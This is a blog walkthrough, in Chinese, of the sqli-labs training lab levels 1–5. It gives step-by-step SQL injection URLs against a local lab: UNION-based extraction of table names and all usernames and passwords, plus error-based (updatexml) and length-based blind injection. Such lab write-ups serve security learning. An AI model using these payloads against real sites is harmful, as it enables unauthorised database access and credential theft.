---
title: 【靶场】sql-labs-Less1-5
date: 2025-08-29
categories:
  - 靶场
image: images/19.webp
---
# Less-1
**验证注入点：单引号报错，两个单引号闭合利用闭合方式：`' <payload> --+`**
1.进入第一题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为`id`
![Pasted image 20250313160458](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160458.png)
2.构造`?id=1`,页面显示正常
```php
http://localhost/sqli-labs/Less-1/?id=1
```
![Pasted image 20250313160541](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160541.png)
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹
```php
http://localhost/sqli-labs/Less-1/?id=1'
```
![Pasted image 20250313160614](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160614.png)
4.构造`?id=1' and '1'='1`页面重新显示正常，由此判断出这题是**单引号字符型注入**
```php
http://localhost/sqli-labs/Less-1/?id=1' and '1'='1
```
![Pasted image 20250313160735](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160735.png)
5.构造`?id=1' order by 1 --+`通过order by子句来判断该数据表的字段数，页面显示正常。
```php
http://localhost/sqli-labs/Less-1/?id=1' order by 1 --+
```
![Pasted image 20250313160914](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313160914.png)
构造`?id=1' order by 4 --+`页面显示错误信息，由此可知该表**字段数为3**
```php
http://localhost/sqli-labs/Less-1/?id=1' order by 4 --+
```
![Pasted image 20250313161001](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161001.png)
6.构造`?id=-1' union select 1,2,3 --+`判断出**回显点为该表的第二、三字段**
```php
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```
![Pasted image 20250313161256](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161256.png)
7.构造`?id=-1' union select 1,2,database() --+`知道了**数据库名为security**
```php
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,database() --+
```
![Pasted image 20250313161350](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161350.png)
8.构造
```php
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
**在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users**
![Pasted image 20250313161444](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161444.png)
9.构造
```php
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
**在数据库information_schema中的columns里查找出数据库security中的users表的全部字段**
![Pasted image 20250313161527](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161527.png)
10.构造
```php
?id=-1' union select 1,group_concat(username),group_concat(password) from users --+
```
**爆出所有的用户名和密码**
![Pasted image 20250313161635](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161635.png)
# Less-2
**验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：`<payload>`**
与第一关基本一样，就 `id` 不用闭合
1.进入第二题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为**id**
![Pasted image 20250313161818](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161818.png)
2.构造`?id=1`,页面显示正常
```php
http://localhost/sqli-labs/Less-2/?id=1
```
![Pasted image 20250313161840](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161840.png)
3.接下来加个单引号，显示语句出错，根据报错信息可以得知是`单引号`影响了SQL语句的闭合，由此判断出这题是**数字型注入**
```php
http://localhost/sqli-labs/Less-2/?id=1'
```
![Pasted image 20250313161910](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313161910.png)
4.构造`?id=1 order by 3 --+`通过order by子句来判断该数据表的字段数
```
http://localhost/sqli-labs/Less-2/?id=1 order by 3 --+
```
![[Pasted image 20250313162025.png]]
构造`?id=1 order by 4 --+`页面报错，由此可知该表**字段数为3**
```
http://localhost/sqli-labs/Less-2/?id=1 order by 4 --+
```
![[Pasted image 20250313162128.png]]
5.构造`?id=-1 union select 1,2,3 --+`判断出**回显点为该表的第二、三字段**
```
http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+
```
![Pasted image 20250313162206](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162206.png)
6.构造`?id=-1 union select 1,2,database() --+`知道了数据库名为security
```php
http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,database() --+
```
![Pasted image 20250313162325](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162325.png)
7.构造
```php
http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
在数据库information_schema中的tables表里查询出security数据库的表有：**emails,referers,uagents,users**
![Pasted image 20250313162432](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162432.png)
8.构造
```php
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
在数据库information_schema中的columns里查找出数据库**security中的users表的全部字段**
![Pasted image 20250313162527](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162527.png)
9.构造
```php
?id=-1 union select 1,group_concat(username),group_concat(password) from users --+
```
**爆出所有的用户名和密码**
![Pasted image 20250313162629](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162629.png)
# Less-3
**验证注入点：单引号报错，两个单引号闭合利用闭合方式：`') <payload> --+`**
也是闭合符号不一样
1.进入第三题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为**id**
![Pasted image 20250313162714](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313162714.png)
2.构造`?id=1`,页面显示正常。
```php
http://localhost/sqli-labs/Less-3/?id=1
```
![[Pasted image 20250313163018.png]]
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数`id`的值被**单引号和括号**包裹
```
http://localhost/sqli-labs/Less-3/?id=1'
```
![Pasted image 20250313163104](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163104.png)
4.构造`?id=1') order by 3 --+`通过order by子句来判断该数据表的字段数
```
http://localhost/sqli-labs/Less-3/?id=1') order by 3 --+
```
![[Pasted image 20250313163156.png]]
构造`?id=1') order by 4 --+`页面报错，由此可知该表**字段数为3**
![Pasted image 20250313163217](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163217.png)
5.构造`?id=-1') union select 1,2,3 --+`判断出回显点为该**表的第二、三字段**
```php
http://localhost/sqli-labs/Less-3/?id=1') union select 1,2,3 --+
```
![[Pasted image 20250313163335.png]]
6.构造`?id=-1') union select 1,2,database() --+`知道了**数据库名为security**
```php
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,2,database() --+
```
![Pasted image 20250313163513](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163513.png)
7.构造
```php
http://localhost/sqli-labs/Less-3/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
在数据库information_schema中的tables表里查询出security数据库的表有：**emails,referers,uagents,users**
![Pasted image 20250313163605](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313163605.png)
8.构造
```php
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
在数据库information_schema中的columns里查找出**数据库security中的users表的全部字段**
![[Pasted image 20250313165309.png]]
9.构造
```php
?id=-1') union select 1,group_concat(username),group_concat(password) from users --+
```
**爆出所有的用户名和密码**
![Pasted image 20250313165344](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165344.png)
# Less-4
**验证注入点：双引号报错，两个双引号闭合利用闭合方式：`") <payload> --+`**
也是闭合符号不一样
1.进入第四题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为**id**
![Pasted image 20250313165443](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165443.png)
2.构造`?id=1`,页面显示正常
![Pasted image 20250313165519](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165519.png)
3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数`id`的值被**双引号和括号**包裹
![Pasted image 20250313165632](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165632.png)
4.构造`?id=1") order by 3 --+`通过order by子句来判断该数据表的字段数,页面显示正常
构造`?id=1") order by 4 --+`页面报错，由此可知该表字段数为3
```
http://localhost/sqli-labs/Less-4/?id=1") order by 3 --+
```
![Pasted image 20250313165810](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165810.png)
5.构造`?id=-1") union select 1,2,3 --+`判断出回显点为该**表的第二、三字段**
![Pasted image 20250313165912](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165912.png)
6.构造`?id=-1") union select 1,2,database() --+`知道了**数据库名为security**
```php
http://localhost/sqli-labs/Less-4/?id=-1") union select 1,2,database() --+
```
![[Pasted image 20250313170055.png]]
7.构造
```php
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
在数据库information_schema中的tables表里查询出security数据库的表有：**emails,referers,uagents,users**
![Pasted image 20250313170137](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170137.png)
8.构造
```
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
在数据库information_schema中的columns里查找出**数据库security中的users表的全部字段**
![Pasted image 20250313170217](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170217.png)
9.构造
```php
?id=-1") union select 1,group_concat(username),group_concat(password) from users --+
```
**爆出所有的用户名和密码**
![Pasted image 20250313170255](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170255.png)
# Less-5
**验证注入点：单引号报错，两个单引号闭合利用闭合方式：`' <payload> --+`
考察点：报错注入**
1.进入第五题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为**id**
![Pasted image 20250313170335](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170335.png)
2.构造`?id=1`,页面显示`You are in...........`，不再像前4题显示`name`和`passwd`
```
http://localhost/sqli-labs/Less-5/?id=1
```
![Pasted image 20250313170403](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170403.png)
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数**id**的值被**单引号**包裹
```
http://localhost/sqli-labs/Less-5/?id=1'
```
![Pasted image 20250313170450](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170450.png)
4.构造`?id=1‘ order by 1 --+`通过order by子句来判断该数据表的字段数，页面显示正常
```
http://localhost/sqli-labs/Less-5/?id=1' order by 1 --+
```
![Pasted image 20250313170613](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png)
构造`?id=1' order by 3 --+`页面显示正常
构造`?id=1' order by 4 --+`页面报错，由此可知该表**字段数为3**
```php
http://localhost/sqli-labs/Less-5/?id=1' order by 3 --+
```
![Pasted image 20250313170613](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png)
5.构造`?id=-1' union select 1,2,3 --+`判断回显点，结果发现行不通
```php
http://localhost/sqli-labs/Less-5/?id=1' union select 1,2,3 --+
```
![Pasted image 20250313170713](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170713.png)
6.构造`?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+`发现可以进行盲注
```php
http://localhost/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+
```
![Pasted image 20250313171431](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313171431.png)
7.也可以使用length()来判断数据库名的长度
```php
http://192.168.58.128/sqli-labs/Less-5/?id=1'and length((select database()))>7 --+
```
![Pasted image 20250313194135](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313194135.png)